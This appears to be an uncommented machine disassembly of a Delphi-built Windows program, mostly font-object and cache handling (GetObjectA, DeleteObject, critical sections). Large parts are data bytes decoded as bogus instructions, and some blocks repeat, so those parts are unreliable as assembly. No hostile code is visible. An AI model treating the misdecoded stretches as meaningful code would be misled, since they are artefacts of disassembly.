add [ eax ] cl
inc edi
jb r-xdata
pop es
pop es
push esp
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x41b5fc70
add [ edx + esi * 4 + 0x41 ] dh
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
inc edx
add ah bl
push ss
inc edx
add [ eax ] bl
and al [ edx ]
pop es
push esp
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x41b67870
add [ edi ] al
lea eax [ bx + si ]
cld
mov ch 0x41
popad
jo r-xdata
popad
nop
inc eax
mov bh 0x41
add [ eax ] al
jo r-xdata
add [ eax ] al
imul esp [ ebx + 0x73 ] 0xb59c0000
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x740041b5 ] ah
add [ eax ] al
add [ eax + 0x700041b3 ] dh
xor eax [ eax ]
jl r-xdata
in al dx
inc ecx
add [ eax - 0x14 ] bl
inc ecx
add [ eax - 0x27ffbdd6 ] dh
in al dx
inc ecx
add [ ebp - 0x12c3ffbe ] dh
inc ecx
add [ ebp + ebp + 0x42 ] cl
add [ eax + 0x2d ] dl
inc edx
add [ eax - 0x13 ] dl
inc ecx
add [ ecx + ebp + 0x42 ] cl
add [ esp + ebp * 8 + 0x41 ] bl
add ah ah
in al dx
inc ecx
add al dh
sub eax [ edx ]
push 0x9000422d
sub eax 0x2da40042
inc edx
add [ 0x6f634954 ] al
outsb
mov eax eax
mov al 0xb7
inc ecx
add [ edi ] al
add eax 0x6f634954
outsb
inc eax
mov bh 0x41
add [ edx + esi * 4 + 0x41 ] dh
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax + 0x58004229 ] ah
aas
inc ecx
add al al
0x29d00041 0x42
add [ eax ] al
add [ eax ] al
imul esp [ ebx + 0x73 ] 0xc08b0000
in al 0xb6
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
mov dh 0x41
add [ eax ] bl
add [ eax ] al
add [ eax + 0x700041b3 ] dh
xor eax [ eax ]
jl r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x4a ] bh
inc ecx
inc eax
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
inc eax
add [ eax + 0x100041b8 ] dl
push esp
push edx
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x41b7 ] dh
inc eax
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + esi * 4 + 0x41 ] ch
add [ eax + eax ] bh
add [ eax ] al
mov al 0xb1
inc ecx
add [ eax + 0x33 ] dh
inc eax
add [ eax ] bl
inc eax
inc ecx
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
mov dh 0x41
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add al ch
add eax 0x6440042
movsd [ edi ] [ esi ]
jne r-xdata
jae r-xdata
imul esp [ ebx + 0x73 ] 0xc0850000
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + esi * 4 + 0x340041 ] ah
add [ eax ] al
mov al 0xb1
inc ecx
add [ eax + 0x33 ] dh
inc eax
add [ eax ] bl
inc eax
inc ecx
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ ecx + ebp ] al
inc edx
add [ ecx + ebp ] dh
inc edx
add [ edx ] cl
push esp
dec ecx
arpl [ edi + 0x6e ] bp
dec ecx
insd
jle r-xdata
arpl [ ebp + 0x4d ] sp
popad
outsb
popad
jb r-xdata
retn
cmp eax [ rw-data ]
pop esi
pop ebx
retn
mov eax esi
call sub_40349c
je r-xdata
add [ ebp + 0x3b0e74c0 ] al
add eax rw-data
inc eax
add [ ecx + 0x31c289d1 ] cl
shl [ esi - 0x3f ] 0xc0
add eax 0x49420232
push eax
call DeleteObject
jne r-xdata
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
retn
sub_41b4c8
test al 0x40
inc ecx
add [ eax - 0x16 ] dl
inc ecx
add [ esi + esi * 8 - 0x14f3ffbf ] dh
inc ecx
add [ edi + esi * 8 + 0x41 ] al
add [ edi + esi * 8 + 0x41 ] cl
add [ eax + 0x580041f7 ] dh
in al dx
inc ecx
add [ eax + edi * 8 ] bh
inc ecx
add [ ecx + edi * 8 ] bl
inc ecx
add [ eax + 0x3c0041fc ] bh
in eax dx
inc ecx
add [ ebp + edi * 8 - 0x257ffbf ] ah
inc ecx
add [ eax ] al
inc [ ecx ]
test al 0xf5
inc ecx
add [ esp + ebp * 8 + 0x41 ] bl
add al bl
sti
inc ecx
add [ eax - 0x63ffbe08 ] ah
cld
inc ecx
add [ ecx + eax + 0x42 ] dl
add al bl
add [ edx ] eax
or [ ebp + ecx * 2 + 0x65 ] edx
je r-xdata
add [ ebx + esi + 0x33780040 ] al
imul bp [ ebp - 0x75 ] 0x30c0
mov ch 0x41
add [ edi ] al
or [ ebp + ecx * 2 + 0x65 ] edx
je r-xdata
pop ss
inc edx
add [ eax - 0x14 ] bl
inc ecx
add [ eax + 0x17 ] ch
inc edx
add [ ebx + ebx + 0x42 ] dl
add [ eax + 0x23 ] dl
inc edx
add [ esp ] ah
inc edx
add [ eax - 0x13 ] al
inc ecx
add [ eax + 0x25 ] cl
inc edx
add [ ebp + 0x106c0042 ] bl
inc edx
add [ esp + ebp * 8 + 0x41 ] bl
add ah ah
in al dx
inc ecx
add [ eax ] dh
sbb al [ edx ]
pop esp
sub [ edx ] al
lodsb [ esi ]
sbb [ edx ] eax
sub [ fs : edx ] al
jl r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add ah dl
adc [ edx ] al
pop eax
aas
inc ecx
add al al
0x11100041 0x42
inc edx
add [ esp + edx * 2 ] cl
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x616d4970
call 0x4441f7a2
push es
imul bp [ ebp - 0x44 ] 0x41b4
add [ edx + esi * 4 + 0x41 ] dh
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
pop es
pop es
push esp
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x41b5fc70
add [ edx + esi * 4 + 0x41 ] dh
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
inc edx
add ah bl
push ss
inc edx
add [ eax ] bl
and al [ edx ]
pop es
push esp
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x41b67870
add [ edi ] al
lea eax [ bx + si ]
cld
mov ch 0x41
popad
jo r-xdata
popad
nop
inc eax
mov bh 0x41
add [ eax ] al
jo r-xdata
add [ eax ] al
imul esp [ ebx + 0x73 ] 0xb59c0000
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x740041b5 ] ah
add [ eax ] al
add [ eax + 0x700041b3 ] dh
xor eax [ eax ]
jl r-xdata
in al dx
inc ecx
add [ eax - 0x14 ] bl
inc ecx
add [ eax - 0x27ffbdd6 ] dh
in al dx
inc ecx
add [ ebp - 0x12c3ffbe ] dh
inc ecx
add [ ebp + ebp + 0x42 ] cl
add [ eax + 0x2d ] dl
inc edx
add [ eax - 0x13 ] dl
inc ecx
add [ ecx + ebp + 0x42 ] cl
add [ esp + ebp * 8 + 0x41 ] bl
add ah ah
in al dx
inc ecx
add al dh
sub eax [ edx ]
push 0x9000422d
sub eax 0x2da40042
inc edx
add [ 0x6f634954 ] al
outsb
mov eax eax
mov al 0xb7
inc ecx
add [ edi ] al
add eax 0x6f634954
outsb
inc eax
mov bh 0x41
add [ edx + esi * 4 + 0x41 ] dh
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax + 0x58004229 ] ah
aas
inc ecx
add al al
0x29d00041 0x42
add [ eax ] al
add [ eax ] al
imul esp [ ebx + 0x73 ] 0xc08b0000
in al 0xb6
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
mov dh 0x41
add [ eax ] bl
add [ eax ] al
add [ eax + 0x700041b3 ] dh
xor eax [ eax ]
jl r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x4a ] bh
inc ecx
inc eax
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
inc eax
add [ eax + 0x100041b8 ] dl
push esp
push edx
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x41b7 ] dh
inc eax
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + esi * 4 + 0x41 ] ch
add [ eax + eax ] bh
add [ eax ] al
mov al 0xb1
inc ecx
add [ eax + 0x33 ] dh
inc eax
add [ eax ] bl
inc eax
inc ecx
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
mov dh 0x41
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add al ch
add eax 0x6440042
movsd [ edi ] [ esi ]
jne r-xdata
jae r-xdata
imul esp [ ebx + 0x73 ] 0xc0850000
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + esi * 4 + 0x340041 ] ah
add [ eax ] al
mov al 0xb1
inc ecx
add [ eax + 0x33 ] dh
inc eax
add [ eax ] bl
inc eax
inc ecx
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ ecx + ebp ] al
inc edx
add [ ecx + ebp ] dh
inc edx
add [ edx ] cl
push esp
dec ecx
arpl [ edi + 0x6e ] bp
dec ecx
insd
jle r-xdata
arpl [ ebp + 0x4d ] sp
popad
outsb
popad
jb r-xdata
retn
cmp eax [ rw-data ]
pop esi
pop ebx
retn
mov eax esi
call sub_40349c
je r-xdata
add [ ebp + 0x3b0e74c0 ] al
add eax rw-data
inc eax
add [ ecx + 0x31c289d1 ] cl
shl [ esi - 0x3f ] 0xc0
add eax 0x49420232
push eax
call DeleteObject
jne r-xdata
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
retn
sub_41b608
test al 0x40
inc ecx
add ah ah
adc al [ edx ]
adc eax [ fs : edx ]
or al 0xeb
inc ecx
add [ eax ] bl
push ss
inc edx
add ah cl
push ss
inc edx
add [ edi + edx ] cl
inc edx
add [ eax - 0x14 ] bl
inc ecx
add [ eax + 0x17 ] ch
inc edx
add [ ebx + ebx + 0x42 ] dl
add [ eax + 0x23 ] dl
inc edx
add [ esp ] ah
inc edx
add [ eax - 0x13 ] al
inc ecx
add [ eax + 0x25 ] cl
inc edx
add [ ebp + 0x106c0042 ] bl
inc edx
add [ esp + ebp * 8 + 0x41 ] bl
add ah ah
in al dx
inc ecx
add [ eax ] dh
sbb al [ edx ]
pop esp
sub [ edx ] al
lodsb [ esi ]
sbb [ edx ] eax
sub [ fs : edx ] al
jl r-xdata
pop es
pop es
push esp
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x41b5fc70
add [ edx + esi * 4 + 0x41 ] dh
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
inc edx
add ah bl
push ss
inc edx
add [ eax ] bl
and al [ edx ]
pop es
push esp
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x41b67870
add [ edi ] al
popad
nop
inc eax
mov bh 0x41
add [ eax ] al
jo r-xdata
in al dx
inc ecx
add [ eax - 0x14 ] bl
inc ecx
add [ eax - 0x27ffbdd6 ] dh
in al dx
inc ecx
add [ ebp - 0x12c3ffbe ] dh
inc ecx
add [ ebp + ebp + 0x42 ] cl
add [ eax + 0x2d ] dl
inc edx
add [ eax - 0x13 ] dl
inc ecx
add [ ecx + ebp + 0x42 ] cl
add [ esp + ebp * 8 + 0x41 ] bl
add ah ah
in al dx
inc ecx
add al dh
sub eax [ edx ]
push 0x9000422d
sub eax 0x2da40042
inc edx
add [ 0x6f634954 ] al
outsb
mov eax eax
mov al 0xb7
inc ecx
add [ edi ] al
add eax 0x6f634954
outsb
inc eax
mov bh 0x41
add [ edx + esi * 4 + 0x41 ] dh
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax + 0x58004229 ] ah
aas
inc ecx
add al al
0x29d00041 0x42
add [ eax ] al
add [ eax ] al
imul esp [ ebx + 0x73 ] 0xc08b0000
in al 0xb6
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
mov dh 0x41
add [ eax ] bl
add [ eax ] al
add [ eax + 0x700041b3 ] dh
xor eax [ eax ]
jl r-xdata
inc eax
add [ eax + 0x100041b8 ] dl
push esp
push edx
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x41b7 ] dh
inc eax
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
movsd [ edi ] [ esi ]
jne r-xdata
jae r-xdata
imul esp [ ebx + 0x73 ] 0xc0850000
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + esi * 4 + 0x340041 ] ah
add [ eax ] al
mov al 0xb1
inc ecx
add [ eax + 0x33 ] dh
inc eax
add [ eax ] bl
inc eax
inc ecx
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ ecx + ebp ] al
inc edx
add [ ecx + ebp ] dh
inc edx
add [ edx ] cl
push esp
dec ecx
arpl [ edi + 0x6e ] bp
dec ecx
insd
jle r-xdata
arpl [ ebp + 0x4d ] sp
popad
outsb
popad
jb r-xdata
retn
cmp eax [ rw-data ]
pop esi
pop ebx
retn
mov eax esi
call sub_40349c
je r-xdata
add [ ebp + 0x3b0e74c0 ] al
add eax rw-data
inc eax
add [ ecx + 0x31c289d1 ] cl
shl [ esi - 0x3f ] 0xc0
add eax 0x49420232
push eax
call DeleteObject
jne r-xdata
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
retn
sub_41b74c
test al 0x40
inc ecx
add [ eax - 0x16 ] dl
inc ecx
add [ eax ] dh
sub al [ edx ]
or al 0xeb
inc ecx
add [ eax + 0x2a ] dh
inc edx
add [ edx + ebp - 0x13abffbe ] bl
inc ecx
add [ eax - 0x14 ] bl
inc ecx
add [ eax - 0x27ffbdd6 ] dh
in al dx
inc ecx
add [ ebp - 0x12c3ffbe ] dh
inc ecx
add [ ebp + ebp + 0x42 ] cl
add [ eax + 0x2d ] dl
inc edx
add [ eax - 0x13 ] dl
inc ecx
add [ ecx + ebp + 0x42 ] cl
add [ esp + ebp * 8 + 0x41 ] bl
add ah ah
in al dx
inc ecx
add al dh
sub eax [ edx ]
push 0x9000422d
sub eax 0x2da40042
inc edx
add [ 0x6f634954 ] al
outsb
mov eax eax
mov al 0xb7
inc ecx
add [ edi ] al
add eax 0x6f634954
outsb
inc eax
mov bh 0x41
add [ edx + esi * 4 + 0x41 ] dh
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
inc eax
add [ eax + 0x100041b8 ] dl
push esp
push edx
jo r-xdata
movsd [ edi ] [ esi ]
jne r-xdata
jae r-xdata
imul esp [ ebx + 0x73 ] 0xc0850000
je r-xdata
jle r-xdata
arpl [ ebp + 0x4d ] sp
popad
outsb
popad
jb r-xdata
retn
cmp eax [ rw-data ]
pop esi
pop ebx
retn
mov eax esi
call sub_40349c
je r-xdata
add [ ebp + 0x3b0e74c0 ] al
add eax rw-data
inc eax
add [ ecx + 0x31c289d1 ] cl
shl [ esi - 0x3f ] 0xc0
add eax 0x49420232
push eax
call DeleteObject
jne r-xdata
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
retn
sub_41b854
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x20 ] cx
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40344c
mov eax esi
pop esi
pop ebx
retn
call sub_4034a4
pop [ fs : 0x0 ]
add esp 0xc
sub_41b890
push ebx
push esi
call sub_4034b4
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40349c
sub_41b8cc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx edx [ eax + 0x20 ]
mov eax ebx
call sub_41b840
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_41b8b4
xor edx edx
push ebp
push sub_41b9a0
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp si [ eax + 0xc ]
jne r-xdata
mov eax [ ebp - 0x8 ]
inc [ eax + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b9a7
mov eax [ ebp - 0x4 ]
call sub_41b8c0
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x20 ]
add eax 0x10
call sub_4026bc
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
mov [ eax ] edx
xor edx edx
mov [ eax + 0x4 ] edx
mov edx [ ebx ]
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] si
mov edx [ ebp - 0x4 ]
movzx ecx [ edx + 0x20 ]
lea edx [ eax + 0x10 ]
mov eax ebx
call sub_4028b8
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
movzx ecx [ eax + 0x20 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
add eax 0x10
call sub_407ae4
test al al
je r-xdata
sub_41b9b0
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_41b8b4
xor ecx ecx
push ebp
push sub_41ba37
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x10 ]
dec [ eax + 0x4 ]
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x4 ] 0x0
sete [ ebp - 0x9 ]
cmp [ ebp - 0x9 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41b8c0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov edx [ eax ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
mov eax edx
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
mov [ eax ] edx
sub_41ba60
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41b8b4
xor eax eax
push ebp
push sub_41bac9
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebx + 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41b8cc
mov esi eax
mov [ ebx + 0x10 ] esi
cmp edi esi
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_41b9b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bad0
mov eax [ ebp - 0x4 ]
call sub_41b8c0
retn
mov eax ebx
mov si 0xfffd
call sub_403324
sub_41bad8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41b8b4
xor eax eax
push ebp
push sub_41bb34
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ esi + 0x10 ]
cmp edi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bb3b
mov eax [ ebp - 0x4 ]
call sub_41b8c0
retn
inc [ edi + 0x4 ]
mov [ esi + 0x10 ] edi
mov eax esi
mov si 0xfffd
call sub_403324
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41b9b0
sub_41bb44
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41b8b4
xor edx edx
push ebp
push sub_41bba3
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bbaa
mov eax [ ebp - 0x4 ]
call sub_41b8c0
retn
mov esi ebx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
cmp [ esi + 0x14 ] 0x0
jge r-xdata
push eax
call DeleteObject
xor eax eax
mov [ esi + 0x8 ] eax
sub_41bbb0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_413c24
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41bc4d
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
cmp eax [ ebp - 0x4 ]
jg r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4138b8
mov ebx eax
mov eax ebx
call sub_41d194
inc [ ebp - 0x4 ]
mov eax ebx
call sub_41d4c0
mov eax [ rw-data ]
call sub_41bb44
mov eax [ rw-data ]
call sub_41bb44
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bc54
mov ebx [ ebp - 0x4 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
call sub_413c88
retn
inc ebx
xor esi esi
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_4138b8
call sub_41d374
inc esi
dec ebx
jne r-xdata
sub_41c2a3
dec [ ebx ]
add [ eax ] al
add [ edi + 0x45 ] cl
dec ebp
pop edi
inc ebx
dec eax
inc ecx
push edx
push ebx
inc ebp
push esp
add [ edx + 0x11 ] ch
mov ecx rw-data
call sub_413368
retn
sub_41c2d4
push ebx
push esi
push edi
add esp 0xffffffa0
mov ebx edx
mov esi eax
push esi
mov edi ebx
mov esi rw-data
mov ecx 0xb
[ edi ] [ esi ]
pop esi
test esi esi
je r-xdata
add esp 0x60
pop edi
pop esi
pop ebx
retn
push esp
push 0x3c
push esi
call GetObjectA
test eax eax
je r-xdata
mov eax [ esp ]
mov [ ebx + 0x4 ] eax
cmp [ esp + 0x10 ] 0x2bc
jl r-xdata
cmp [ esp + 0x14 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x1
cmp [ esp + 0x15 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x2
cmp [ esp + 0x16 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x4
mov al [ esp + 0x17 ]
mov [ ebx + 0xa ] al
lea eax [ esp + 0x3c ]
lea edx [ esp + 0x1c ]
mov ecx 0x20
call sub_402c3c
lea edx [ esp + 0x3c ]
lea eax [ ebx + 0xb ]
mov cl 0x1f
call sub_402a2c
mov al [ esp + 0x1b ]
and al 0xf
dec al
je r-xdata
or [ ebx + 0x9 ] 0x8
mov [ ebx + 0x8 ] 0x2
jmp r-xdata
dec al
jne r-xdata
mov [ ebx ] esi
mov [ ebx + 0x8 ] 0x0
mov [ ebx + 0x8 ] 0x1
jmp r-xdata
sub_41c388
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor eax eax
mov [ rw-data ] eax
mov edx rw-data
mov eax [ rw-data ]
call sub_41b8cc
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0xff000008
mov eax [ rw-data ]
mov [ esi + 0x1c ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40344c
mov eax esi
pop esi
pop ebx
retn
call sub_4034a4
pop [ fs : 0x0 ]
add esp 0xc
sub_41c3dc
push ebx
push esi
call sub_4034b4
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_41b9b0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40349c
sub_41c420
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_413e74
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41c0e0
xor eax eax
push ebp
push sub_41c4db
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_41c0e0
xor eax eax
push ebp
push sub_41c4be
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41bad8
mov edx [ ebx + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_41c55c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
cmp eax [ ebx + 0x1c ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c4c5
mov eax [ ebp - 0x8 ]
call sub_41c0f0
retn
mov eax ebx
call sub_41c7e0
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_41c7fc
sub_41c50c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41c0e0
xor eax eax
push ebp
push sub_41c551
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41ba60
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c558
mov eax [ ebp - 0x4 ]
call sub_41c0f0
retn
sub_41c570
push ebp
mov ebp esp
add esp 0xffffffb4
push ebx
xor edx edx
mov [ ebp - 0x4c ] edx
mov [ ebp - 0x48 ] edx
mov [ ebp - 0x44 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41c6f9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c700
lea eax [ ebp - 0x4c ]
mov edx 0x3
call sub_403e9c
retn
mov eax [ rw-data ]
call sub_41b8b4
xor eax eax
push ebp
push sub_41c6d1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41b8c0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov [ ebp - 0x40 ] eax
xor eax eax
mov [ ebp - 0x3c ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
xor eax eax
